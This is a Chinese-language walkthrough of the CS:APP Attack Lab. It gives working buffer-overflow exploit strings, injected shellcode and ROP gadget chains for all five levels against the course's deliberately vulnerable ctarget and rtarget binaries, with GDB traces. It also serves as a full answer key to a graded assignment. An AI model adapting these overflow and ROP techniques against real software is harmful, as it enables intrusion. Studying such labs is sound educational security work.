### ***attacklab***
***
## LeveL 1
通过阅读README.md文件，了解我们的任务，`test()`函数中调用了`getbuf()`函数，我们希望在执行完`getbuf()`函数后不要返回`test()`函数，而是返回到`touch1()`函数。

`unix> objdump -d ctarget > ctarget.s`命令可以将`ctarget`文件反汇编成汇编代码。

先找到`touch1()`的函数地址，`00000000004017c0`     

调用`hex2raw`将把文本形式的十六进制字符串，转换成真正的二进制原始字节流。   
`unix> ./hex2raw < exploit.txt > exploit-raw.txt`
 
这样就可以在GDB调试中，将原始字符串存储在一个文件中，并以命令行参数的形式提供文件名
```
unix> gdb ctarget
(gdb) run -q < exploit-raw.txt (-q是为了关闭notify)
```
我们使用GDB调速器，在调用`getbuf()`函数中的`Gets()`设置一个断点，查看输入字符串后栈的情况。
```
(gdb) x/16gx $rsp
0x5561dc78:     0x4241353433323130      0x0000000000004443
0x5561dc88:     0x0000000000000000      0x0000000000000000
0x5561dc98:     0x0000000055586000      0x0000000000401976
0x5561dca8:     0x0000000000000009      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
可以看到0x5561dca0地址处的值就是返回地址，我们只要通过字符串输入溢出用touch1()函数的地址覆盖掉这个返回地址，就可以实现攻击了。
 
我们修改一下exploit.txt文件
```
30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 00 00 00 00 00 40 17 c0
```
尝试运行
```
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa

Program received signal SIGSEGV, Segmentation fault.
0x00000000004017bd in getbuf () at buf.c:16
16      in buf.c
(gdb) continue
Continuing.
Type string:Ouch!: You caused a segmentation fault!
Better luck next time
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:0:30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 00 00 00 00 00 40 17 C0 
[Inferior 1 (process 5721) exited with code 01]
```
发生了报错，我们重新打一下调点看看修改输入文件后栈的值是否和我们期望中的一样。
```
(gdb) x/16gx $rsp
0x5561dc78:     0x4241353433323130      0x4241353433323130
0x5561dc88:     0x4241353433323130      0x4241353433323130
0x5561dc98:     0x4241353433323130      0xc017400000000000
0x5561dca8:     0x0000000000000000      0x0000000000401f24
0x5561dcb8:     0x0000000000000000      0xf4f4f4f4f4f4f4f4
0x5561dcc8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dcd8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
0x5561dce8:     0xf4f4f4f4f4f4f4f4      0xf4f4f4f4f4f4f4f4
```
发现我们输入的返回地址反了😄(Linux是小端法，即低位字节放在地址小的地方)，我们重新修改一下输入文件的值再次尝试。
```
30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 c0 17 40 00 00 00 00 00
```
```
(gdb) run -q < exploit-raw.txt
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Touch1!: You called touch1()
Valid solution for level 1 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:1:30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 30 31 32 33 34 35 41 42 C0 17 40 00 00 00 00 00 
[Inferior 1 (process 8439) exited normally]
```
可以看到我们成功调用了`touch1()`函数，完成了攻击实验的第一级。

## LeveL 2

阅读一下README文件，查看一下我们的目标，我们需要返回到`touch2()`函数，并且设置好cookie的值。我们查看`touch2()`函数的地址,修改我们的exploit.txt文件。
`00000000004017ec`

查看`touch2()`的汇编代码
```
00000000004017ec <touch2>:
  4017ec:	48 83 ec 08          	sub    $0x8,%rsp
  4017f0:	89 fa                	mov    %edi,%edx
  4017f2:	c7 05 e0 2c 20 00 02 	movl   $0x2,0x202ce0(%rip)        # 6044dc <vlevel>
  4017f9:	00 00 00 
  4017fc:	3b 3d e2 2c 20 00    	cmp    0x202ce2(%rip),%edi        # 6044e4 <cookie>
  401802:	75 20                	jne    401824 <touch2+0x38>
```
我们需要使寄存器`%rdi`的值等于cookie的值。我们设置好`touch2()`的返回地址后，打断点查看一下cookie的值和%rdi的值
```
(gdb) p/x $edi
$8 = 0xf7fb6980
(gdb) x/16gx 0x202ce2+$rip
0x6044e4 <cookie>:      0x0000000059b997fa      0x0000000000000000
0x6044f4:       0x0000000000000000      0x3320303300000000
0x604504 <gets_buf+4>:  0x2033332032332031      0x3134203533203433
0x604514 <gets_buf+20>: 0x3320303320323420      0x2033332032332031
0x604524 <gets_buf+36>: 0x3134203533203433      0x3320303320323420
0x604534 <gets_buf+52>: 0x2033332032332031      0x3134203533203433
0x604544 <gets_buf+68>: 0x3320303320323420      0x2033332032332031
0x604554 <gets_buf+84>: 0x3134203533203433      0x3320303320323420
```
我们研究一下怎么修改%rdi的值使其等于cookie,先看一下%rdi的值是怎么来的，研究汇编代码发现，在调用`touch2()`函数之前，`%rdi`的值由`Gets()`函数设置的。
```assembly
401a67:	48 8b 3d 62 2a 20 00 	mov    0x202a62(%rip),%rdi        # 6044d0 <infile>
```
```(gdb) x/x 0x202a62+0x401a6e
0x6044d0 <infile>:      0x00007ffff7fb6980
```
修改%rdi的值需要注入代码来修改%rdi的值，我们可以在输入字符串中注入下列代码(这里为什么要使用pushq指令呢？因为我们需要在修改%rdi的值后返回到`touch2()`函数，所以我们需要将`touch2()`函数的地址压入栈中，然后使用ret指令返回到`touch2()`函数)。    
***
同时涉及到一个栈对齐的问题，**Linux系统要求栈必须是16字节对齐的**，我们发现，在进入`getbuf()`函数的时候，`sub    $0x28,%rsp`,而我们并没有正常返回(即%rsp没有加回来)，而是返回到了`touch2()`函数，`touch2()`函数中有一条单独的指令`sub $0x8, %rsp`，也就是说，在我们没有注入代码之前，这个%rsp = 0x28 - 0x8 = 0x20,是16字节对齐的，而我们注入的代码包含了`ret`指令,而`ret`指令的本质是`%rip = *rsp++,jmp %rip`，也就是说在执行完`ret`指令后，%rsp会加8字节，所以我们需要保证在执行完`ret`指令后，%rsp仍然是16字节对齐的，而`pushq`指令会将%rsp减8字节，所以我们需要在注入的代码中使用`pushq`指令来保证栈的对齐。
***
   
通过注入下列代码
```assembly
mov $cookie, %rdi
pushq $0x4017ec
ret 
```
的机器码来修改%rdi的值。怎么得到这个机器码呢？我们先编写一段需要注入的汇编代码
```assembly
.text                   #代码（指令）
.globl _start           #全局符号_start，链接器从这里开始执行
_start:                 #程序入口
mov $0x59b997fa, %rdi   #将cookie的值放入rdi寄存器
pushq $0x4017ec         #将touch2函数的地址压入栈中
ret                     #返回到touch2函数
```
先生成目标文件，然后再反汇编查看机器码
```
unix> as --64 -o tmp.o tmp.s
unix> objdump -d tmp.o

tmp.o:     file format elf64-x86-64
Disassembly of section .text:

0000000000000000 <_start>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 ec 17 40 00          pushq  $0x4017ec
   c:   c3                      retq                      retq
```
可以得到我们需要注入的代码为`48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3`，我们将这个机器码注入到输入字符串中，并且设置好返回地址为这个栈地址，就可以运行我们注入的代码来修改%rdi的值了。 
***
下面为完整的输入字符串
```
48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00  

```
运行结果
```
(gdb) run -q < exploit-raw.txt
Starting program: /home/emilia/emilia/csapplab/attacklab/target1/ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:2:48 C7 C7 FA 97 B9 59 68 EC 17 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 
[Inferior 1 (process 34464) exited normally]
```
## Level 3

任务跟前面的LeveL一样，需要回到`touch3()`函数，而不是返回到`test()`函数，同时还涉及`hexmatch()`函数，下面两个函数c语言代码如下:
```c
/* Compare string to hes represention of unsigned value */
int hexmatch(unsigned val, char *sval)
{
        char cbuf[110];
        /* Make position of check string unpredictable */
        char *s = cbuf + random() % 100;
        sprintf(s, "%.8x", val);
        return strncmp(sval, s, 9) == 0;
}

void touch3(char *sval)
{
        vlevel = 3; /* Part of validation protocol */
        if (hexmatch(cookie, sval))
        {
                printf("Touch3!: You called touch3(\"%s\")\n", sval);
        }
        else {
                printf("Misfire: You called touch3(\"%s\")\n", sval);
                fail(3);
        }
        exit(0);
}
```
通过研究`hexmatch() touch3() getbuf()`函数，首先`touch3()`函数的`char *sval`参数是**LeveL 2**中提到的`%rdi`寄存器的值(由infile定义)，而`hexmatch()`函数将`cookie`值放在cbuf数组的一个随机位置，并且将这个位置的地址赋值给`s`指针，然后将`s`指针指向的字符串与`sval`进行比较，也就是说，我们需要将cookie值在进入`touch3()`函数之前注入到输入字符串中，这样才能成功调用`touch3()`函数。

先找到`touch3()`函数的地址
`00000000004018fa`   
我们将断点打在`hexmatch()`函数调用之前，看看输入参数的情况。
```
(gdb) p/x $rdi
$2 = 0x59b997fa
(gdb) p/x $rsi
$3 = 0x7ffff7fb6980
```
猜测我们只需要像level2那样就行注入代码攻击即可成功，尝试一下。
```
0000000000000000 <_start>:
   0:   48 c7 c7 fa 97 b9 59    mov    $0x59b997fa,%rdi
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq
```
不出意外报错了,通过在`hexmatch()`函数入口打断点调试发现
```
hexmatch (val=1505335290, 
    sval=sval@entry=0x59b997fa <error: Cannot access memory at address 0x59b997fa>) at visible.c:62
62      in visible.c
```
发现`hexmatch()`函数的第二个参数`sval`的值是我们注入的cookie值，而不是一个字符串，所以我们需要将cookie值转换成字符串的形式注入到输入字符串中，这样才能成功调用`hexmatch()`函数.
```assembly
.text                   # 代码（指令）
.globl _start           # 全局符号_start，链接器从这里开始执行
_start:                 # 程序入口
leaq str(%rip), %rdi    # 把字符串地址放 rdi
pushq $0x4018fa         # 将touch3函数的地址压入栈中
ret                     # 返回到touch3函数

str:
    .string "59b997fa"
```
```
0000000000000000 <_start>:
   0:   48 8d 3d 06 00 00 00    lea    0x6(%rip),%rdi        # d <str>
   7:   68 fa 18 40 00          pushq  $0x4018fa
   c:   c3                      retq   

000000000000000d <str>:
   d:   35 39 62 39 39          xor    $0x39396239,%eax
  12:   37                      (bad)  
  13:   66 61                   data16 (bad)
```
```
48 8d 3d 06 00 00 00 68 fa 18 40 00 c3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00
```
又报错了   
```
root@LAPTOP-0PTH5R3A:/home/emilia/emilia/csapplab/attacklab/target1# ./ctarget -q < exploit-raw.txt
Cookie: 0x59b997fa
Type string:Misfire: You called touch3("")
FAIL: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:FAIL:0xffffffff:ctarget:3:48 8D 3D 06 00 00 00 68 FA 18 40 00 C3 35 39 62 39 39 37 66 61 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00
```

我们注入的字符串没有成功传递到`touch3()`函数中，经过调试发现：    
- 我把注入代码入口覆盖成了 0x5561dc78（最后 8 字节）。
- 代码里 leaq str(%rip), %rdi 得到的 str 大约是 0x5561dc85（代码后面紧跟字符串）。
- 但执行 ret 跳到 touch3 之前，%rsp 已经回到调用者栈顶（约 0x5561dca8 一带）。
- touch3 -> hexmatch -> sprintf/strncmp 会继续在栈上分配和写入，覆盖 %rsp 以下地址。
- 我的字符串地址 0x5561dc85 在 %rsp 以下，所以很容易被踩坏，hexmatch 比较时就失败。

所以只需要将字符串的位置放置在返回地址的上面就可以了，修改一下输入文件的值再次尝试。
```assembly
.text                   # 代码（指令）
.globl _start           # 全局符号_start，链接器从这里开始执行
_start:                 # 程序入口
mov    %rsp, %rdi       # rdi = 当前栈指针
pushq $0x4018fa         # 将touch3函数的地址压入栈中
ret                     # 返回到touch3函数

# 强制把字符串放在 0x402000 地址
.org 0x5561dca8        # 关键！指定地址
my_str:
    .string "59b997fa"  # 字符串
```

```
0000000000000000 <_start>:
           0:   48 89 e7                mov    %rsp,%rdi
           3:   68 fa 18 40 00          pushq  $0x4018fa
           8:   c3                      retq   
        ...

000000005561dca8 <my_str>:
    5561dca8:   35 39 62 39 39          xor    $0x39396239,%eax
    5561dcad:   37                      (bad)  
    5561dcae:   66 61                   data16 (bad)
```

```
48 89 e7 68 fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00
```
```
Continuing.
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target ctarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:ctarget:3:48 89 E7 68 FA 18 40 00 C3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 DC 61 55 00 00 00 00 35 39 62 39 39 37 66 61 00 
[Inferior 1 (process 32849) exited normally]
```
可以发现我们成功调用了`touch3()`函数，并且成功通过了`hexmatch()`函数的验证，完成了攻击实验的第三级。

## Level 4

***Return-Oriented-Programming (ROP)***

对程序RTARGET执行代码注入攻击要比`CTARGET`困难，因为使用两种技术来阻止这种攻击：
- 他使用随机化，以便堆栈的位置每次运行时都会不同。这使得无法确定注入的代码位于何处。
- 他使用了一个保护机制，称为**不可执行栈**，这意味着即使你成功地将代码注入到栈中，也无法执行它。

ROP的策略是在现有程序中识别字节序列，该程序由一个或多个指令组成，后面跟着指令ret. 这些字节序列被称为**gadgets**，我们可以使用这些gadgets来构建一个攻击链，以实现我们想要的功能。

### some advice

- 只需要两个小工具就可以完成这个攻击
- 只使用前8个x86-64指令集的寄存器（%rax, %rbx, %rcx, %rdx, %rsi, %rdi, %rsp, %rbp）来构建攻击链

阅读README文件，将重复第二阶段的攻击，但是使用你的小工具场中的小工具在`RTARGET`上攻击，只需要两个小工具就可以完成这个攻击，回顾一下阶段二的任务，我们需要覆盖掉返回地址，使其返回`touch2()`函数，同时还需要注入代码来修改%rdi的值，使其等于cookie的值，这样才能成功调用`touch2()`函数.

我们发现，禁止的是`执行栈上的字节`，不是`改返回地址`，所以我们需要通过改返回地址去执行现有代码段里的gadget来修改%rdi的值，使其等于cookie的值，然后再返回到`touch2()`函数。同时gadget有效的指令并不是从首字节开始的，所以我们设置返回地址的时候要加上偏移量，才能正确的执行gadget中的指令。

`gadget(1)(pop rax) -- > cookie --> gadget(2) --> touch2()`，这个gadget的功能是将栈顶的值弹出到%rdi寄存器中，然后返回到下一个地址.

我们在rtarget中找到我们想要的gadget
```assembly
00000000004019c3 <setval_426>: # 89,movl eax edi,nop ret
  4019c3:	c7 07 48 89 c7 90    	movl   $0x90c78948,(%rdi)
  4019c9:	c3                   	retq   

00000000004019ca <getval_280>: # 58，pop rax nop ret 
  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax
  4019cf:	c3                   	retq
```
这两个gadget正好可以让我们将cookie的值放入%rdi寄存器中，并且返回到`touch2()`函数中.

构建`exploit.txt`文件，先填充0x28字节，然后用gadget(1)的地址覆盖返回地址，接着是cookie的值，最后是gadget(2)的地址和`touch2()`函数的地址。这里需要弄清楚`ret : %rip = *%rsp++, jmp %rip`,`pop : %rax = *%rsp++`，就可以弄清楚`%rsp的变化`，自然知道每个地址和数据应该放在什么位置了。

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 c6 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00
```

```
Cookie: 0x59b997fa
Type string:Touch2!: You called touch2(0x59b997fa)
Valid solution for level 2 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:2:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 C6 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 
```
可见我们成功调用了`touch2()`函数，并且成功通过了验证，完成了攻击实验的第四级。 已经完成了***95/100***😄.

## Level 5

要求对`RTARGET`执行ROP攻击，以使用指向cookie的字符串表示形式的指针调用`touch3()`函数。这视乎并不比使用`ROP`攻击来调用`touch2()`函数困难得多，只是我们已经这样做了，虽然第5阶段只计算了5分，但是这不能真正衡量他所需要的努力。

可以使用目标区域中由start_farm和end_fram函数划分的代码区域中的gadget.

### Adivice

- 你需要检查一下movl指令对寄存器上面4个字节的影响
- 官方的解决方案需要8个小工具(并非所有都是独一无二)

回顾我们解决level3的攻击，我们需要将cookie的字符串表示形式放在栈上，然后将这个地址放入%rdi寄存器中，最后返回到`touch3()`函数中，这样才能成功调用`touch3()`函数。

由于rtarget栈地址会随机化，固定地址不稳定，但是和当前%rsp的相对偏移是可控的，所以我们可以用用加法类 gadget 算出 字符串地址 = 基址 + offset。 
 
我们找到一个gadget就可以做这种计算.
```assembly
00000000004019d6 <add_xy>:
  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
  4019da:	c3                   	retq
```

然后我们就可以搭建我们的攻击链........经过一定时间的查找，在有限的指令确定我们的攻击链：
- movq rsp rax
- movq rax rdi
- pop rax
- offset
- movl eax edx
- movl edx ecx
- movl ecx esi
- lea (%rdi,%rsi,1),%rax
- movq rax rdi
- touch3()
- cookie

又这个链条可得，offset = 9 * 0x8 = 0x48,也就是说我们需要在输入字符串中注入0x48的偏移量，这样才能正确的计算出字符串的地址，最后成功调用`touch3()`函数。

确定好逻辑之后就可以编写exploit.txt文件了，下面是完整的输入字符串
```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1a 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 69 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00
```

```
Cookie: 0x59b997fa
Type string:Touch3!: You called touch3("59b997fa")
Valid solution for level 3 with target rtarget
PASS: Would have posted the following:
        user id bovik
        course  15213-f15
        lab     attacklab
        result  1:PASS:0xffffffff:rtarget:3:00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 06 1A 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 48 00 00 00 00 00 00 00 DD 19 40 00 00 00 00 00 69 1A 40 00 00 00 00 00 13 1A 40 00 00 00 00 00 D6 19 40 00 00 00 00 00 A2 19 40 00 00 00 00 00 FA 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 00 
```
可以看到我们成功调用了`touch3()`函数，并且成功通过了验证，完成了攻击实验的第五级。 已经完成了***100/100***😄.

### result
总结一下这5个实验，对于攻击实验的第一级和第二级，我们需要通过注入代码来修改返回地址和寄存器的值来实现攻击；对于攻击实验的第三级，我们需要通过注入代码来修改返回地址和寄存器的值，并且还需要将字符串放在栈上；对于攻击实验的第四级和第五级，我们需要通过ROP攻击来实现攻击，这需要我们找到合适的gadget来构建我们的攻击链。总的来说，这5个实验涵盖了从简单的代码注入攻击到复杂的ROP攻击，帮助我们深入理解了缓冲区溢出攻击的原理和技术。

- 修改返回地址：利用的是对于没有数组溢出保护的函数，输入超过缓冲区大小的数据会覆盖掉返回地址，从而改变程序的控制流。
- 注入代码：在数组上输入特定的机器码，通过将返回地址修改为数组的地址，这些机器码会被当作指令执行，从而实现攻击者想要的功能.
- ROP攻击：利用程序中已经存在的代码片段（gadget）来构建攻击链，通过修改返回地址来执行这些gadget，从而实现攻击者想要的功能。这种攻击方式不需要注入新的代码，因此可以绕过不可执行栈的保护机制.







